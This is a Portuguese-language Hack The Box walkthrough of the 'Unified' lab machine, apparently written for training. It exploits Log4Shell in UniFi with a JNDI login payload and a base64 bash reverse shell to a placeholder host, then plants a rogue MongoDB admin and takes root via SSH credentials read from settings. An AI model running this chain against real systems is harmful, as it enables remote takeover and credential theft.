# HTB - Unified Write-up

## Informações

* Máquina: Unified
* Plataforma: Hack The Box
* Dificuldade: Easy
* Objetivo: Obter acesso inicial via Log4Shell, capturar a flag do usuário e escalar privilégios até root.

---

# 1. Enumeração Inicial

Realizamos um scan completo da máquina:

```bash
nmap -sC -sV -p- <IP_DA_MAQUINA>
```

### Portas encontradas

| Porta | Serviço                   |
| ----- | ------------------------- |
| 22    | SSH                       |
| 8443  | UniFi Network Application |

A interface web estava disponível em:

```text
https://<IP>:8443
```

Versão identificada:

```text
UniFi Network Application 6.4.54
```

Esta versão é vulnerável ao **Log4Shell (CVE-2021-44228)**.

---

# 2. Exploração - Log4Shell

## Preparação

Clonamos e compilamos o RogueJNDI:

```bash
git clone https://github.com/veracode-research/rogue-jndi.git

cd rogue-jndi

mvn package -DskipTests
```

---

## Listener

Abrimos um listener:

```bash
nc -lvnp 4444
```

---

## Gerando Payload

Codificamos o reverse shell em Base64:

```bash
echo 'bash -c bash -i >& /dev/tcp/SEU_IP/4444 0>&1' | base64 -w 0
```

---

## Iniciando RogueJNDI

```bash
java -jar target/RogueJndi-1.1.jar \
--command "bash -c {echo,SUA_BASE64_AQUI}|{base64,-d}|{bash,-i}" \
--hostname "SEU_IP"
```

---

## Disparando a Vulnerabilidade

Interceptamos a requisição de login:

```http
POST /api/login
```

Payload utilizado:

```json
{
  "username":"admin",
  "password":"admin",
  "remember":"${jndi:ldap://SEU_IP:1389/o=tomcat}",
  "strict":true
}
```

Após enviar a requisição, recebemos um reverse shell como:

```bash
unifi
```

---

## Melhorando o Shell

```bash
script /dev/null -c bash
```

# 3. Capturando a User Flag

Listamos os diretórios de usuários:

```bash
ls /home
```

Entramos no diretório de michael:

```bash
cd /home/michael
```

Lemos a flag:

```bash
cat user.txt
```

---

# 4. Enumeração do MongoDB

Verificamos processos:

```bash
ps aux | grep mongo
```

Verificamos a configuração:

```bash
cat /usr/lib/unifi/data/system.properties | grep mongo
```

Informações obtidas:

```text
Porta: 27117
Database: ace
```

---

# 5. Escalação de Privilégios

Conectamos ao banco:

```bash
mongo --port 27117
```

Selecionamos o banco:

```javascript
use ace
```

Visualizamos os administradores:

```javascript
db.admin.find().pretty()
```

Foi possível identificar usuários e hashes armazenados na coleção.

---

## Criando Novo Administrador

Inserimos um novo usuário administrativo:

```javascript
db.admin.insert({
  "email" : "hacker@unified.htb",
  "last_site_name" : "default",
  "name" : "hacker",
  "time_created" : NumberLong(1640900495),
  "x_shadow" : "$6$/H/eDWRkR4Y62y3y$g/5emeC9bvebAIaYNrZA2cbMT6oSi8cqzYHNE5VLyyJKSxJqGha8A9HPKwg342G2QmTNHu9RiBTb/jgQXuFB41"
})
```

Credenciais:

```text
Usuário: hacker
Senha: password
```

---

# 6. Obtendo Credenciais SSH

Acessamos novamente:

```text
https://<IP>:8443
```

Login:

```text
hacker : password
```

Navegação:

```text
Settings → System
```

Nas configurações do dispositivo encontramos as credenciais SSH.

```text
Usuário: root
Senha: NotACrackablePassword4U2022
```

---

# 7. Acesso Root

Conectamos via SSH:

```bash
ssh root@<IP_DA_MAQUINA>
```

Senha:

```text
NotACrackablePassword4U2022
```

Confirmamos acesso:

```bash
whoami
```

Saída:

```text
root
```

---

# 8. Root Flag

Lemos a flag final:

```bash
cat /root/root.txt
```
